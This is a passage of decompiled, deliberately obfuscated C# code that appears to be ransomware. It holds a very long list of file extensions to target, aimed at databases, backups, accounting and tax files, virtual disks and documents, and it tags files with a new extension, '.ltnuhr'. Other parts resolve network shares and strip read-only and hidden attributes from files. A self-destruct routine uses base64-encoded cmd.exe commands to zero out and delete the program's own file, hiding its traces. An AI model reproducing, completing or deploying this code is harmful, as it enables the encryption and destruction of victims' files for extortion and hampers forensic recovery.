					"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
					"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
					"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
					"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
					"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
					"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
					"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
					"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
					"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
					"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
					"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
					"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
					"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
					"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
					"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
					"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
					"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
					"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
					"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
					"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
					"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
					"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
					"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
					"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
					"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
					"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
					"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
					"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
					"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
					"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
					"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
					"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
					"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
					"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
					"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
					"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
					"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
					"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
					"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
					"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
					"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
					"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
					"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
					"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
					"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
					"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
					"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
					"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
					"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
					"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
					"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
					"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
					"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
					"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
					"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
					"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
					"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
					"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
					"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
					"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
					"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
					"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
					"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
					"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
					"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
					"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
					"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
					"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
					"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
					"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
					"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
					"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
					"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
					"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
					"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
					"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
					"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
					"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
					"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
					"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
					"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
					"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
					"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
					"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
					"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
					"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
					"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
					"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
					"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
					"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
					"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
					"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
					"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
					"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
					"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
					"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
					"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
					"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
					"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
					"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
					"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
					"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
					"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
					"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
					"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
					"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
					"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
					"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
					"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
					"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
					"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
					"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
					"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
					"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
					"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
					"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
					"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
					"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
					"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
					"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
					"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
					"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
					"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
					"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
					"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
					"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
					"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
					"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
					"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
					"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
					"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
					"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
					"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
					"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
					"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
					"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
					"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
					"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
					"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
					"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
					"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
					"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
					"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
					"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
					"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
					"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
					"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
					"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
					"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
					"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
					"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
					"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
					"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
					"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
					"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
					"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
					"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
					"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
					"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
					"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
					"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
					"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
					"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
					"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
					"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
					"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
					"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
					"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
					"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
					"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
					"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
					"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
					"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
					"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
					"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
					"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
					"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
					"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
					"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
					"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
					"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
					"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
					"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
					"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
					"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
					"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
					"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
					"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
					"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
					"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
					"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
					"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
					"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
					"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
					"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
					"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
					"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
					"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
					"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
					"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
					"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
					"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
					"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
					"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
					"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
					"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
					"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
					"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
					"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
					"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
					"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
					"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
					"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
					"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
					"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
					"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
					"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
					"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
					"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
					"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
					"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
					"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
					"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
					"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
					"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
					"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
					"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
					"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
					"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
					"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
					"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
					"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
					"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
					"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
					"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
					"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
					"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
					"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
					"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
					"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
					"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
					"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
					"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
					"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
					"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
					"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
					"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
					"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
					"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
					"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
					"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
					"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
					"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
					"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
					"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
					"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
					"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
					"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
					"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
					"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
					"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
					"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
					"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
					"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
					"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
					"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
					"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
					"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
					"AVHD", "AVHDX", "OVA"
				}, ".ltnuhr", new string[0], FdUEgPawbnib);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string xKIIIGbqAUOYWWJV, int pXvDwwmPaN, IntPtr QeKQepjOtqxMI, ref int LYNzBJtRrAe);

	private static string uBkYPWUaIYhOPOSL(string SllGlHEQIdj, int mQaGVLMaXluz = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(mQaGVLMaXluz);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(SllGlHEQIdj, 1, intPtr, ref mQaGVLMaXluz) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void orYmYqWIcxewG()
	{
		bhxKBVXCniiAP("cmd.exe", agZtqMkMayfivgE("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = agZtqMkMayfivgE("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void BDUUIKslMbszMvU(string uhjsnWZEki)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(uhjsnWZEki);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(uhjsnWZEki, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(uhjsnWZEki);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(uhjsnWZEki, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (bZJnUpHOpIgqq)
			{
				try
				{
